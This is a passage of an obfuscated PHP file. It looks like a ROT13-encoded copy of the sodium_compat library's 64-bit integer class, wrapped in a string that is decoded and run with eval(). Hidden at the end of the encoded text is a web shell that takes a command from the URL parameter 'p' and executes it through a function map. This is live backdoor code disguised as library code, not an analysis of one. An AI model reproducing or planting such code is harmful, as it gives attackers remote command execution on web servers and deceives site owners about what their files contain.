        $erghea->yvzof[3]  = (vag) ((CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[6]) & 0kss) << 8);
        $erghea->yvzof[3] |= (CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[7]) & 0kss);
        erghea $erghea;
    }

    /**
     * @cnenz fgevat $fgevat
     * @erghea frys
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp fgngvp shapgvba sebzErirefrFgevat($fgevat)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($fgevat, 'fgevat', 1);
        $fgevat = (fgevat) $fgevat;
        vs (CnentbaVR_Fbqvhz_Pber32_Hgvy::fgeyra($fgevat) !== 8) {
            guebj arj EnatrRkprcgvba(
                'Fgevat zhfg or 8 olgrf; ' . CnentbaVR_Fbqvhz_Pber32_Hgvy::fgeyra($fgevat) . ' tvira.'
            );
        }
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();

        $erghea->yvzof[0]  = (vag) ((CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[7]) & 0kss) << 8);
        $erghea->yvzof[0] |= (CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[6]) & 0kss);
        $erghea->yvzof[1]  = (vag) ((CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[5]) & 0kss) << 8);
        $erghea->yvzof[1] |= (CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[4]) & 0kss);
        $erghea->yvzof[2]  = (vag) ((CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[3]) & 0kss) << 8);
        $erghea->yvzof[2] |= (CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[2]) & 0kss);
        $erghea->yvzof[3]  = (vag) ((CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[1]) & 0kss) << 8);
        $erghea->yvzof[3] |= (CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[0]) & 0kss);
        erghea $erghea;
    }

    /**
     * @erghea neenl<vag, vag>
     */
    choyvp shapgvba gbNeenl()
    {
        erghea neenl(
            (vag) ((($guvf->yvzof[0] & 0kssss) << 16) | ($guvf->yvzof[1] & 0kssss)),
            (vag) ((($guvf->yvzof[2] & 0kssss) << 16) | ($guvf->yvzof[3] & 0kssss))
        );
    }

    /**
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     */
    choyvp shapgvba gbVag32()
    {
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->yvzof[0] = (vag) ($guvf->yvzof[2]);
        $erghea->yvzof[1] = (vag) ($guvf->yvzof[3]);
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $erghea->biresybj = (vag) (CnentbaVR_Fbqvhz_Pber32_Hgvy::nof($guvf->yvzof[1], 16) & 0kssss);
        erghea $erghea;
    }

    /**
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     */
    choyvp shapgvba gbVag64()
    {
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->yvzof[0] = (vag) ($guvf->yvzof[0]);
        $erghea->yvzof[1] = (vag) ($guvf->yvzof[1]);
        $erghea->yvzof[2] = (vag) ($guvf->yvzof[2]);
        $erghea->yvzof[3] = (vag) ($guvf->yvzof[3]);
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $erghea->biresybj = CnentbaVR_Fbqvhz_Pber32_Hgvy::nof($guvf->biresybj);
        erghea $erghea;
    }

    /**
     * @cnenz obby $obby
     * @erghea frys
     */
    choyvp shapgvba frgHafvtarqVag($obby = snyfr)
    {
        $guvf->hafvtarqVag = !rzcgl($obby);
        erghea $guvf;
    }

    /**
     * @erghea fgevat
     * @guebjf GlcrReebe
     */
    choyvp shapgvba gbFgevat()
    {
        erghea CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue(($guvf->yvzof[0] >> 8) & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue($guvf->yvzof[0] & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue(($guvf->yvzof[1] >> 8) & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue($guvf->yvzof[1] & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue(($guvf->yvzof[2] >> 8) & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue($guvf->yvzof[2] & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue(($guvf->yvzof[3] >> 8) & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue($guvf->yvzof[3] & 0kss);
    }

    /**
     * @erghea fgevat
     * @guebjf GlcrReebe
     */
    choyvp shapgvba gbErirefrFgevat()
    {
        erghea CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue($guvf->yvzof[3] & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue(($guvf->yvzof[3] >> 8) & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue($guvf->yvzof[2] & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue(($guvf->yvzof[2] >> 8) & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue($guvf->yvzof[1] & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue(($guvf->yvzof[1] >> 8) & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue($guvf->yvzof[0] & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue(($guvf->yvzof[0] >> 8) & 0kss);
    }

    /**
     * @erghea fgevat
     */
    choyvp shapgvba __gbFgevat()
    {
        gel {
            erghea $guvf->gbFgevat();
        } pngpu (GlcrReebe $rk) {
            // CUC ratvar pna'g unaqyr rkprcgvbaf sebz __gbFgevat()
            erghea '';
        }
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>